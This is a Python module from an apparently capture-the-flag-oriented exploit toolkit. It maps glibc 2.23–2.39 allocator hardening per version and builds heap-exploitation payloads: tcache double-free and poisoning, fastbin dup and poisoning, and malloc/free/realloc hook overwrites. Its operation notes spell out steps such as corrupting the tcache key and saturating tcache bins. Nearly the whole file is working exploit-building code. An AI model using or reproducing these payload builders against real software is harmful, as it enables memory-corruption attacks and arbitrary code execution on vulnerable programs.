"""glibc 2.23--2.39 allocator-version planners composed from r5b heap builders.

This module does not duplicate allocator payload serialization.  It selects the existing tcache or
fastbin builders, then annotates their shared :class:`PayloadBuild` contract with the exact version
transition constraints that decide whether the route is meaningful.  Nothing is executed or sent.
"""
from __future__ import annotations

import functools
import json
import struct
from dataclasses import dataclass
from typing import Mapping

try:
    from .contract import BuildError, PayloadBuild, ensure_uint
    from . import heap_families as families
except ImportError:  # pragma: no cover - repository direct-import convention
    from contract import BuildError, PayloadBuild, ensure_uint
    import heap_families as families


MIN_MINOR = 23
MAX_MINOR = 39
SUPPORTED_VERSIONS = tuple(f"2.{minor}" for minor in range(MIN_MINOR, MAX_MINOR + 1))


class VersionMatrixError(BuildError):
    """A glibc version or allocator route is unsupported/inconsistent."""


def _wrap_matrix_errors(func):
    """Convert delegated heap/contract validation errors to the declared type.

    The planners compose the family builders (``families.HeapBuildError``) and the
    shared contract (``BuildError`` from ``ensure_uint``).  A caller of the matrix
    entrypoints should only ever observe :class:`VersionMatrixError`, so any such
    delegated error that is not already a ``VersionMatrixError`` is re-raised as
    one.  Valid inputs never reach this handler.
    """

    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except VersionMatrixError:
            raise
        except (families.HeapBuildError, BuildError) as exc:
            raise VersionMatrixError(str(exc)) from exc

    return wrapper


@dataclass(frozen=True)
class AllocatorProfile:
    version: str
    minor: int
    tcache: bool
    tcache_key_check: bool
    safe_linking: bool
    aligned_next_check: bool
    malloc_hooks_effective: bool
    tcache_precedes_fastbin: bool
    fastbin_head_double_free_check: bool
    tcache_count: int
    tcache_max_chunk_lp64: int
    tcache_max_chunk_lp32: int
    tcache_entry_words: int
    constraints: tuple[str, ...]

    def as_dict(self) -> dict[str, object]:
        return {
            "version": self.version,
            "minor": self.minor,
            "tcache": self.tcache,
            "tcache_key_check": self.tcache_key_check,
            "safe_linking": self.safe_linking,
            "aligned_next_check": self.aligned_next_check,
            "malloc_hooks_effective": self.malloc_hooks_effective,
            "tcache_precedes_fastbin": self.tcache_precedes_fastbin,
            "fastbin_head_double_free_check": self.fastbin_head_double_free_check,
            "tcache_count": self.tcache_count,
            "tcache_max_chunk_lp64": self.tcache_max_chunk_lp64,
            "tcache_max_chunk_lp32": self.tcache_max_chunk_lp32,
            "tcache_entry_words": self.tcache_entry_words,
            "constraints": list(self.constraints),
        }


def _make_profile(minor: int) -> AllocatorProfile:
    tcache = minor >= 26
    keyed = minor >= 29
    safe = minor >= 32
    hooks = minor <= 33
    constraints = [
        "profile models upstream release-tag defaults; validate distro backports and tunables",
        "fastbin rejects an immediate duplicate of the current bin head",
        "fastbin size must match the selected bin and checked fake header",
    ]
    if not tcache:
        constraints.append("tcache is absent; eligible frees route directly to legacy bins")
    else:
        constraints.extend((
            "tcache is consulted before fastbin for eligible sizes",
            "default per-bin tcache capacity is seven entries",
        ))
    if keyed:
        constraints.append("tcache_entry.key participates in duplicate-free detection")
    if safe:
        constraints.extend((
            "singly linked next pointers use PROTECT_PTR(slot, pointer)",
            "revealed tcache/fastbin next pointers must satisfy allocator alignment",
        ))
    if not hooks:
        constraints.append("__malloc_hook/__free_hook/__realloc_hook are no longer effective endpoints")
    return AllocatorProfile(
        version=f"2.{minor}", minor=minor, tcache=tcache,
        tcache_key_check=keyed, safe_linking=safe, aligned_next_check=safe,
        malloc_hooks_effective=hooks, tcache_precedes_fastbin=tcache,
        fastbin_head_double_free_check=True, tcache_count=7 if tcache else 0,
        tcache_max_chunk_lp64=0x410 if tcache else 0,
        tcache_max_chunk_lp32=0x208 if tcache else 0,
        tcache_entry_words=2 if keyed else (1 if tcache else 0),
        constraints=tuple(constraints),
    )


VERSION_MATRIX: Mapping[str, AllocatorProfile] = {
    version: _make_profile(int(version.split(".")[1])) for version in SUPPORTED_VERSIONS
}


def profile_for(glibc_version: str) -> AllocatorProfile:
    """Return the explicit supported profile; patch suffixes select their minor line."""
    if not isinstance(glibc_version, str) or len(glibc_version) > 32:
        raise VersionMatrixError("glibc_version must be a short 2.MINOR string")
    parts = glibc_version.split(".")
    if len(parts) < 2 or parts[0] != "2" or not parts[1].isdigit():
        raise VersionMatrixError("glibc_version must be 2.MINOR")
    key = f"2.{int(parts[1])}"
    try:
        return VERSION_MATRIX[key]
    except KeyError as exc:
        raise VersionMatrixError("supported allocator matrix is glibc 2.23 through 2.39") from exc


def _enrich(
    result: families.HeapBuild,
    profile: AllocatorProfile,
    *,
    route: str,
    operations: tuple[str, ...],
    constraints: tuple[str, ...],
) -> PayloadBuild:
    compact = result.as_payload_build()
    metadata = dict(compact.metadata)
    metadata.update({
        "allocator_profile": json.dumps(profile.as_dict(), sort_keys=True, separators=(",", ":")),
        "operations": json.dumps(operations, separators=(",", ":")),
        "constraints": json.dumps(constraints, separators=(",", ":")),
        "route": route,
        "hook_endpoint": "available" if profile.malloc_hooks_effective else "removed-use-ROP-or-FILE",
    })
    return PayloadBuild(
        payload=compact.payload, placements=compact.placements, widths=compact.widths,
        architecture=compact.architecture, strategy=f"versioned-{route}",
        base_address=compact.base_address, metadata=metadata,
    )


def build_allocator_profile_block(glibc_version: str) -> PayloadBuild:
    """Serialize a compact, inert policy block for deterministic tooling and notes."""
    profile = profile_for(glibc_version)
    flags = (
        int(profile.tcache)
        | int(profile.tcache_key_check) << 1
        | int(profile.safe_linking) << 2
        | int(profile.malloc_hooks_effective) << 3
        | int(profile.tcache_precedes_fastbin) << 4
    )
    payload = struct.pack(
        "<4sBBBBHHI", b"R5BV", 2, profile.minor, flags,
        profile.tcache_entry_words, profile.tcache_count,
        profile.tcache_max_chunk_lp64, 0,
    )
    return PayloadBuild(
        payload=payload,
        placements={"magic": 0, "major": 4, "minor": 5, "flags": 6,
                    "entry_words": 7, "tcache_count": 8, "tcache_max_chunk": 10},
        widths={"magic": 4, "major": 1, "minor": 1, "flags": 1,
                "entry_words": 1, "tcache_count": 2, "tcache_max_chunk": 2},
        architecture="glibc-lp64", strategy="allocator-version-profile",
        metadata={"profile": json.dumps(profile.as_dict(), sort_keys=True, separators=(",", ":"))},
    )


@_wrap_matrix_errors
def build_versioned_tcache(
    *, action: str, glibc_version: str, chunk_addr: int, chunk_size: int,
    peer_or_target_addr: int, bits: int = 64, fd_slot_addr: int | None = None,
) -> PayloadBuild:
    """Select existing tcache dup/poison serialization under a version profile."""
    profile = profile_for(glibc_version)
    if not profile.tcache:
        raise VersionMatrixError(f"glibc {profile.version} has no tcache; use versioned fastbin")
    if isinstance(chunk_size, bool) or not isinstance(chunk_size, int):
        raise VersionMatrixError("chunk_size must be an integer")
    tcache_max = profile.tcache_max_chunk_lp64 if bits == 64 else profile.tcache_max_chunk_lp32
    if bits not in (32, 64) or chunk_size > tcache_max:
        raise VersionMatrixError(
            f"chunk_size exceeds the default {bits}-bit tcache range for glibc {profile.version}"
        )
    if action == "dup":
        result = families.build_tcache_dup(
            glibc_version=profile.version, chunk_addr=chunk_addr, chunk_size=chunk_size,
            next_chunk_addr=peer_or_target_addr, tcache_key=0, bits=bits,
        )
        operations = (
            "free the selected chunk into a non-full tcache bin",
            ("clear/corrupt tcache_entry.key before the duplicate free"
             if profile.tcache_key_check else "repeat the free using the challenge's double-free primitive"),
            "allocate through the duplicate list",
        )
        constraints = list(profile.constraints)
        if not profile.tcache_key_check:
            constraints.append("the second serialized word is ordinary user data, not an allocator key")
        route = "tcache-dup"
    elif action in ("poison", "poisoning"):
        result = families.build_tcache_poison(
            glibc_version=profile.version, freed_chunk_addr=chunk_addr,
            chunk_size=chunk_size, target_addr=peer_or_target_addr,
            fd_slot_addr=fd_slot_addr, clear_key=profile.tcache_key_check, bits=bits,
        )
        operations = (
            "free the chunk into the selected tcache bin",
            "apply the version-correct next-pointer overwrite",
            "allocate the real entry and then the caller-supplied target",
        )
        constraints = list(profile.constraints)
        if profile.safe_linking:
            constraints.append("fd_slot_addr must be the real storage address used by PROTECT_PTR")
        route = "tcache-poison"
    else:
        raise VersionMatrixError("tcache action must be dup or poison")
    return _enrich(result, profile, route=route, operations=operations,
                   constraints=tuple(constraints))


@_wrap_matrix_errors
def build_versioned_fastbin(
    *, action: str, glibc_version: str, chunk_addr: int, chunk_size: int,
    peer_or_fake_addr: int, bits: int = 64, fd_slot_addr: int | None = None,
    max_fast_chunk: int | None = None,
) -> PayloadBuild:
    """Select existing fastbin dup/poison serialization and model tcache interception."""
    profile = profile_for(glibc_version)
    if bits not in (32, 64):
        raise VersionMatrixError("bits must be 32 or 64")
    if isinstance(chunk_size, bool) or not isinstance(chunk_size, int):
        raise VersionMatrixError("chunk_size must be an integer")
    default_max_fast = 0x80 if bits == 64 else 0x40
    effective_max_fast = default_max_fast if max_fast_chunk is None else max_fast_chunk
    ensure_uint(effective_max_fast, bits, name="max_fast_chunk")
    alignment = 16 if bits == 64 else 8
    if effective_max_fast < alignment * 2 or effective_max_fast % alignment:
        raise VersionMatrixError("max_fast_chunk must be an aligned chunk size")
    if chunk_size > effective_max_fast:
        raise VersionMatrixError("chunk_size exceeds max_fast_chunk and cannot use this fastbin route")
    if action == "dup":
        result = families.build_fastbin_dup(
            glibc_version=profile.version, chunk_addr=chunk_addr,
            chunk_size=chunk_size, next_chunk_addr=peer_or_fake_addr,
            fd_slot_addr=fd_slot_addr, max_fast_chunk_size=max_fast_chunk, bits=bits,
        )
        route = "fastbin-dup"
    elif action in ("poison", "poisoning"):
        result = families.build_fastbin_poison(
            glibc_version=profile.version, victim_chunk_addr=chunk_addr,
            fake_chunk_addr=peer_or_fake_addr, chunk_size=chunk_size,
            fd_slot_addr=fd_slot_addr, max_fast_chunk_size=max_fast_chunk, bits=bits,
        )
        route = "fastbin-poison"
    else:
        raise VersionMatrixError("fastbin action must be dup or poison")
    constraints = list(profile.constraints)
    tcache_max = profile.tcache_max_chunk_lp64 if bits == 64 else profile.tcache_max_chunk_lp32
    if profile.tcache and chunk_size <= tcache_max:
        constraints.append("fill seven entries in the matching tcache bin before freeing to fastbin")
        grooming = "allocate/free seven same-size guard chunks to saturate tcache"
    else:
        grooming = "no tcache diversion for this version/size"
    operations = (
        grooming,
        "establish a non-head duplicate (A/B/A) or overwrite the freed victim FD",
        "allocate through the reviewed fastbin list",
    )
    return _enrich(result, profile, route=route, operations=operations,
                   constraints=tuple(constraints))


@_wrap_matrix_errors
def build_versioned_hook_overwrite(
    *, glibc_version: str, hook_address: int, replacement_address: int,
    hook: str = "free", bits: int = 64,
) -> PayloadBuild:
    """Serialize a hook pointer only for versions where malloc hooks are effective."""
    profile = profile_for(glibc_version)
    if not profile.malloc_hooks_effective:
        raise VersionMatrixError(
            f"glibc {profile.version} removed effective malloc hooks; choose ROP/JOP/FILE instead"
        )
    if hook not in ("malloc", "free", "realloc"):
        raise VersionMatrixError("hook must be malloc, free, or realloc")
    if isinstance(bits, bool) or bits not in (32, 64):
        raise VersionMatrixError("bits must be 32 or 64")
    ensure_uint(hook_address, bits, name="hook_address")
    ensure_uint(replacement_address, bits, name="replacement_address")
    if not hook_address or not replacement_address:
        raise VersionMatrixError("hook and replacement addresses must be non-zero")
    width = bits // 8
    if hook_address + width > 1 << bits:
        raise VersionMatrixError("hook target range crosses the ABI address space")
    payload = replacement_address.to_bytes(width, "little")
    return PayloadBuild(
        payload=payload,
        placements={f"{hook}_hook_value": 0}, widths={f"{hook}_hook_value": width},
        architecture="amd64" if bits == 64 else "i386", strategy=f"glibc-{hook}-hook",
        base_address=hook_address,
        metadata={
            "profile": json.dumps(profile.as_dict(), sort_keys=True, separators=(",", ":")),
            "constraints": json.dumps((
                "hook_address must come from the exact loaded libc",
                "the caller must possess a separate write primitive",
                "the trigger must invoke the selected allocator hook",
            ), separators=(",", ":")),
            "delivery": "none",
        },
    )


__all__ = [
    "AllocatorProfile", "MAX_MINOR", "MIN_MINOR", "SUPPORTED_VERSIONS", "VERSION_MATRIX",
    "VersionMatrixError", "profile_for", "build_allocator_profile_block",
    "build_versioned_tcache", "build_versioned_fastbin", "build_versioned_hook_overwrite",
]
